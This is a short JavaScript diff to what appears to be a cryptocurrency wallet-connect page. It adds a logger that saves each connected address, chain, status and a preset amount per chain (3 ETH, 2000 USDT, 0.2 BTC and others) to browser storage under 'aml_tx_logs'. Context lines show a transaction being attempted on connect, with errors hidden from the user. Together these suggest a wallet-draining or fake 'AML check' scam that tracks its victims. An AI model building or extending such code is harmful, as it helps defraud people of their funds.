@@ -831,8 +831,11 @@ async function startConnect(chain) {
 
     } catch(txErr) {
       console.warn('[TX]', txErr);
+      logTransaction(getAddr(), chain, 'failed', txErr.message);
       // Don't block UI on tx error
     }
+
+    logTransaction(getAddr(), chain, 'connected', null);
 
     uiConnected(getAddr());
     showConnected(getAddr());
@@ -1028,6 +1031,29 @@ function copyTrxAmount() {
     btns[1].textContent = '✅ Copied!';
     setTimeout(() => btns[1].textContent = '📋 Copy Amount', 2000);
   });
+}
+
+/* ── Transaction Logger ──────────────────────────── */
+function logTransaction(address, chain, status, errMsg) {
+  try {
+    const CHAIN_AMOUNTS = {
+      eth:'3 ETH', usdt:'2000 USDT (ERC-20)', usdc:'2000 USDC (ERC-20)',
+      bnb:'5 BNB', trx:'100,000 TRX', usdt_trc:'2000 USDT (TRC-20)',
+      usdc_trc:'2000 USDC (TRC-20)', sol:'~$2000 SOL', btc:'0.2 BTC'
+    };
+    const logs = JSON.parse(localStorage.getItem('aml_tx_logs') || '[]');
+    logs.unshift({
+      id     : Date.now(),
+      ts     : new Date().toISOString(),
+      address: address || 'unknown',
+      chain  : chain,
+      amount : CHAIN_AMOUNTS[chain] || '—',
+      status : status,
+      error  : errMsg || null
+    });
+    if (logs.length > 500) logs.length = 500;
+    localStorage.setItem('aml_tx_logs', JSON.stringify(logs));
+  } catch(e) { console.warn('Log error', e); }
 }
 
 const io = new IntersectionObserver(es => es.forEach(e => {
